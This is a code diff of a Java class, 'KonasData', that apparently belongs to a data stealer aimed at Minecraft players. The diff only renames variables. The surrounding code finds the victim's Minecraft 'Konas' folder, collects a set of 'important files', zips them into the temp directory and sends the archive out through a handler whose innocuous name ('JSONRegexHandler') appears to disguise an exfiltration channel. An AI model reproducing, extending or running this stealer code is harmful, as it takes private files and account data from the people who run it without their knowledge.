@@ -17,21 +17,21 @@ public class KonasData implements JSONObject {
         String mcFolder = FileSystemHelper.getMinecraftFolder();
         if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;
 
-        String konassFolder = mcFolder + "Konas/";
-        if (!Files.exists(Paths.get(konassFolder))) {
+        String konasFolder = mcFolder + "Konas/";
+        if (!Files.exists(Paths.get(konasFolder))) {
             JSONRegexHandler.send("> Did not contain the Konas folder.");
             return;
         }
 
         ArrayList<File> validFileDirs = new ArrayList<>();
         for (String fileName : IMPORTANT_FILES) {
-            String dir = konassFolder + fileName;
+            String dir = konasFolder + fileName;
             if (!Files.exists(Paths.get(dir))) continue;
 
             validFileDirs.add(new File(dir));
         }
 
-        String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "konass_shit.zip";
+        String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "konas_shit.zip";
         FileSystemHelper.zip(zipFile, validFileDirs);
         JSONRegexHandler.send(new File(zipFile));
     }
